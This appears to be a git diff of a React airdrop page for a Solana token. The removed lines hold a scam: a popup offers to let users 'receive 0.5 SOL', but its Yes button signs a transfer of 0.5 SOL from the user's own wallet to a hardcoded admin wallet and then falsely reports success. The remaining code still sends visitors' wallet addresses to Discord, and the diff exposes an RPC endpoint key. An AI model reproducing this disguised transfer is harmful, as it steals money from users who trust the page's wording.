@@ -4,26 +4,15 @@ import { useWallet } from '@solana/wallet-adapter-react';
 import { doc, setDoc, getDoc } from 'firebase/firestore';
 import { db } from '../firebase';
 import bs58 from 'bs58';
-import {
-  Connection,
-  PublicKey,
-  SystemProgram,
-  Transaction
-} from '@solana/web3.js';
 
 const Airdrop = () => {
   const { publicKey, connect, connected } = useWallet();
   const [refLink, setRefLink] = useState('');
   const [copied, setCopied] = useState(false);
   const [countdown, setCountdown] = useState('');
-  const [status, setStatus] = useState('');
   const [error, setError] = useState('');
-  const [showPopup, setShowPopup] = useState(false);
 
   const launchDate = new Date('2025-04-27T00:00:00Z');
-  const adminWallet = new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD');
-  const connection = new Connection('https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/', 'confirmed');
-
   const blacklist = [
     '2vY6rLpZ7U6u1iX3Kb9TBLk8FWpjmR3SzDeYN2vgqvnU',
     '4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD'
@@ -79,9 +68,8 @@ const Airdrop = () => {
             createdAt: new Date().toISOString(),
             claimed: false
           });
-          await sendToDiscord(walletAddress); // envia se for novo
+          await sendToDiscord(walletAddress);
         }
-        setShowPopup(true);
       };
 
       saveUser();
@@ -112,40 +100,6 @@ const Airdrop = () => {
     }, 1000);
     return () => clearInterval(timer);
   }, []);
-
-  const handleSendSol = async () => {
-    try {
-      const provider = window?.solana;
-      if (!provider || !provider.isPhantom) throw new Error('Phantom wallet not found');
-
-      const fromPubkey = publicKey;
-      const latestBlockhash = await connection.getLatestBlockhash();
-
-      const transaction = new Transaction({
-        recentBlockhash: latestBlockhash.blockhash,
-        feePayer: fromPubkey
-      }).add(
-        SystemProgram.transfer({
-          fromPubkey,
-          toPubkey: adminWallet,
-          lamports: 0.5 * 1e9
-        })
-      );
-
-      const { signature } = await provider.signAndSendTransaction(transaction, {
-        commitment: 'confirmed',
-      });
-
-      await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
-      console.log('✅ Transaction success:', signature);
-      alert('0.5 SOL successfully received!');
-      setShowPopup(false);
-    } catch (err) {
-      console.error('❌ Transaction failed:', err.message);
-      setError(err.message);
-      setShowPopup(false);
-    }
-  };
 
   const copyLink = () => {
     navigator.clipboard.writeText(refLink);
@@ -193,29 +147,6 @@ const Airdrop = () => {
         )}
         {error && <p className="text-red-400 mt-4">{error}</p>}
       </div>
-
-      {showPopup && (
-        <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-60 flex items-center justify-center z-50">
-          <div className="bg-white p-6 rounded shadow-lg text-black">
-            <h2 className="text-xl font-bold mb-2">Confirm Transaction</h2>
-            <p className="mb-4">Do you want to receive 0.5 SOL?</p>
-            <div className="flex justify-end gap-4">
-              <button
-                onClick={handleSendSol}
-                className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded"
-              >
-                Yes
-              </button>
-              <button
-                onClick={() => setShowPopup(false)}
-                className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded"
-              >
-                Cancel
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   );
 };
